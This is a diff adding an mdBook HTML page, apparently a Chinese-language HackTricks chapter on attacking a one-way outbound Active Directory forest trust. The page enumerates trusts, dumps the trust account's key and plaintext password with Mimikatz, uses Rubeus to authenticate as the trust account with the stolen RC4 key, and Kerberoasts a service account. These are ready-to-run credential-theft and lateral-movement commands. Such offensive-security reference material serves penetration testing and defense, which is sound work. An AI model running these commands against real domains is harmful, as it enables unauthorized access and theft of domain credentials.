@@ -1,0 +1,281 @@
+<!DOCTYPE HTML>
+<html lang="zh" class="light sidebar-visible" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>External Forest Domain - One-Way (Outbound)</title>
+
+
+        <!-- Custom HTML head -->
+
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="../../favicon.svg">
+        <link rel="shortcut icon" href="../../favicon.png">
+        <link rel="stylesheet" href="../../css/variables.css">
+        <link rel="stylesheet" href="../../css/general.css">
+        <link rel="stylesheet" href="../../css/chrome.css">
+        <link rel="stylesheet" href="../../css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="../../fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="../../highlight.css">
+        <link rel="stylesheet" href="../../tomorrow-night.css">
+        <link rel="stylesheet" href="../../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+
+
+        <!-- Provide site root to javascript -->
+        <script>
+            var path_to_root = "../../";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
+        </script>
+        <!-- Start loading toc.js asap -->
+        <script src="../../toc.js"></script>
+    </head>
+    <body>
+    <div id="body-container">
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            const html = document.documentElement;
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add("js");
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            var sidebar = null;
+            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+            }
+            sidebar_toggle.checked = sidebar === 'visible';
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <!-- populated by js -->
+            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
+            <noscript>
+                <iframe class="sidebar-iframe-outer" src="../../toc.html"></iframe>
+            </noscript>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title"></h1>
+
+                    <div class="right-buttons">
+                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="外部森林域---单向出站"><a class="header" href="#外部森林域---单向出站">外部森林域 - 单向（出站）</a></h1>
+<p>{% hint style="success" %}
+学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
+学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
+<details>
+<summary>支持 HackTricks</summary>
+<ul>
+<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
+<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
+<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 分享黑客技巧。</li>
+</ul>
+</details>
+{% endhint %}
+<p>在此场景中 <strong>您的域</strong> 正在 <strong>信任</strong> 来自 <strong>不同域</strong> 的某些 <strong>权限</strong>。</p>
+<h2 id="枚举"><a class="header" href="#枚举">枚举</a></h2>
+<h3 id="出站信任"><a class="header" href="#出站信任">出站信任</a></h3>
+<pre><code class="language-powershell"># Notice Outbound trust
+Get-DomainTrust
+SourceName      : root.local
+TargetName      : ext.local
+TrustType       : WINDOWS_ACTIVE_DIRECTORY
+TrustAttributes : FOREST_TRANSITIVE
+TrustDirection  : Outbound
+WhenCreated     : 2/19/2021 10:15:24 PM
+WhenChanged     : 2/19/2021 10:15:24 PM
+
+# Lets find the current domain group giving permissions to the external domain
+Get-DomainForeignGroupMember
+GroupDomain             : root.local
+GroupName               : External Users
+GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
+MemberDomain            : root.io
+MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
+MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
+## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
+</code></pre>
+<h2 id="trust-account-attack"><a class="header" href="#trust-account-attack">Trust Account Attack</a></h2>
+<p>当在两个域之间建立信任关系时，存在安全漏洞，这里将其称为域 <strong>A</strong> 和域 <strong>B</strong>，其中域 <strong>B</strong> 将其信任扩展到域 <strong>A</strong>。在这种设置中，在域 <strong>A</strong> 中为域 <strong>B</strong> 创建了一个特殊账户，该账户在两个域之间的身份验证过程中发挥着关键作用。与域 <strong>B</strong> 关联的此账户用于加密访问跨域服务的票证。</p>
+<p>这里需要理解的关键点是，可以使用命令行工具从域 <strong>A</strong> 的域控制器中提取此特殊账户的密码和哈希。执行此操作的命令是：</p>
+<pre><code class="language-powershell">Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
+</code></pre>
+<p>此提取之所以可能，是因为该账户在其名称后带有 <strong>$</strong>，处于活动状态，并且属于域 <strong>A</strong> 的“域用户”组，从而继承了与该组相关的权限。这使得个人可以使用该账户的凭据对域 <strong>A</strong> 进行身份验证。</p>
+<p><strong>警告：</strong> 利用这种情况可以作为用户在域 <strong>A</strong> 中获得立足点，尽管权限有限。然而，这种访问足以对域 <strong>A</strong> 进行枚举。</p>
+<p>在 <code>ext.local</code> 是信任域而 <code>root.local</code> 是被信任域的场景中，将在 <code>root.local</code> 中创建一个名为 <code>EXT$</code> 的用户账户。通过特定工具，可以转储 Kerberos 信任密钥，从而揭示 <code>root.local</code> 中 <code>EXT$</code> 的凭据。实现此目的的命令是：</p>
+<pre><code class="language-bash">lsadump::trust /patch
+</code></pre>
+<p>在此之后，可以使用提取的 RC4 密钥通过另一个工具命令以 <code>root.local\EXT$</code> 身份在 <code>root.local</code> 中进行身份验证：</p>
+<pre><code class="language-bash">.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:&lt;RC4&gt; /dc:dc.root.local /ptt
+</code></pre>
+<p>此身份验证步骤打开了枚举甚至利用 <code>root.local</code> 中服务的可能性，例如执行 Kerberoast 攻击以提取服务帐户凭据，使用：</p>
+<pre><code class="language-bash">.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
+</code></pre>
+<h3 id="收集明文信任密码"><a class="header" href="#收集明文信任密码">收集明文信任密码</a></h3>
+<p>在之前的流程中，使用了信任哈希而不是<strong>明文密码</strong>（该密码也被<strong>mimikatz</strong>提取）。</p>
+<p>明文密码可以通过将mimikatz的[ CLEAR ]输出从十六进制转换并去除空字节‘\x00’来获得：</p>
+<p><img src="../../.gitbook/assets/image%20(938).png" alt="" /></p>
+<p>有时在创建信任关系时，用户必须输入信任的密码。在这个演示中，密钥是原始信任密码，因此是人类可读的。随着密钥的循环（30天），明文将不再是人类可读的，但在技术上仍然可用。</p>
+<p>明文密码可以用作信任账户进行常规身份验证，作为使用信任账户的Kerberos密钥请求TGT的替代方案。在这里，从ext.local查询root.local的Domain Admins成员：</p>
+<p><img src="../../.gitbook/assets/image%20(792).png" alt="" /></p>
+<h2 id="参考文献"><a class="header" href="#参考文献">参考文献</a></h2>
+<ul>
+<li><a href="https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted">https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted</a></li>
+</ul>
+<p>{% hint style="success" %}
+学习与实践AWS黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks Training AWS Red Team Expert (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
+学习与实践GCP黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks Training GCP Red Team Expert (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
+<details>
+<summary>支持HackTricks</summary>
+<ul>
+<li>查看<a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
+<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord群组</strong></a>或<a href="https://t.me/peass"><strong>Telegram群组</strong></a>或<strong>在</strong> <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>上关注我们。</strong></li>
+<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a>和<a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub库提交PR来分享黑客技巧。</li>
+</ul>
+</details>
+{% endhint %}
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="../../windows-hardening/active-directory-methodology/external-forest-domain-oneway-inbound.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+
+                            <a rel="next prefetch" href="../../windows-hardening/active-directory-methodology/golden-ticket.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="../../windows-hardening/active-directory-methodology/external-forest-domain-oneway-inbound.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+
+                    <a rel="next prefetch" href="../../windows-hardening/active-directory-methodology/golden-ticket.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="../../elasticlunr.min.js"></script>
+        <script src="../../mark.min.js"></script>
+        <script src="../../searcher.js"></script>
+
+        <script src="../../clipboard.min.js"></script>
+        <script src="../../highlight.js"></script>
+        <script src="../../book.js"></script>
+
+        <!-- Custom JS scripts -->
+
+
+    </div>
+    </body>
+</html>
